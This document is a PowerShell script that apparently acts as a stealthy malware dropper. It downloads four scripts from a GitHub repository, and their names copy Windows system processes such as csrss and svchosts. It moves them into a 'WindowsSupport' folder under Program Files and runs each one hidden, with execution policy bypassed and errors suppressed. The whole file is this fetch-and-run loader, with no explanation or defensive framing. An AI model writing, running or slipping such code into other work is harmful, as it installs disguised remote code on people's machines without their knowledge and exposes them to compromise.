$ScriptURLs = @(
    "https://raw.githubusercontent.com/merankhairuddin/WinSysTools/refs/heads/main/taskhostw.ps1",
    "https://raw.githubusercontent.com/merankhairuddin/WinSysTools/refs/heads/main/svchosts.ps1",
    "https://raw.githubusercontent.com/merankhairuddin/WinSysTools/refs/heads/main/csrss.ps1",
    "https://raw.githubusercontent.com/merankhairuddin/WinSysTools/refs/heads/main/UpdateSyncTask.ps1"
)

$TempDownloadFolder = "C:\Windows\Temp\SystemUpdates"
$ProgramFilesFolder = "C:\Program Files\WindowsSupport"

if (-Not (Test-Path -Path $TempDownloadFolder)) {
    New-Item -ItemType Directory -Path $TempDownloadFolder | Out-Null
}

if (-Not (Test-Path -Path $ProgramFilesFolder)) {
    New-Item -ItemType Directory -Path $ProgramFilesFolder | Out-Null
}

function Download-Script {
    param (
        [string]$URL,
        [string]$SaveFolder
    )

    $FileName = Split-Path -Leaf $URL
    $LocalFilePath = Join-Path -Path $SaveFolder -ChildPath $FileName

    try {
        Invoke-WebRequest -Uri $URL -OutFile $LocalFilePath -UseBasicParsing
        return $LocalFilePath
    } catch {
        return $null
    }
}

function Move-Script {
    param (
        [string]$SourceFilePath,
        [string]$DestinationFolder
    )

    $FileName = Split-Path -Leaf $SourceFilePath
    $DestinationFilePath = Join-Path -Path $DestinationFolder -ChildPath $FileName

    try {
        Move-Item -Path $SourceFilePath -Destination $DestinationFilePath -Force
        return $DestinationFilePath
    } catch {
        return $null
    }
}

function Execute-Script {
    param (
        [string]$ScriptPath
    )

    try {
        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $ScriptPath" -WindowStyle Hidden
    } catch {}
}

foreach ($URL in $ScriptURLs) {
    $DownloadedScript = Download-Script -URL $URL -SaveFolder $TempDownloadFolder

    if ($DownloadedScript) {
        $MovedScript = Move-Script -SourceFilePath $DownloadedScript -DestinationFolder $ProgramFilesFolder

        if ($MovedScript) {
            Execute-Script -ScriptPath $MovedScript
        }
    }
}
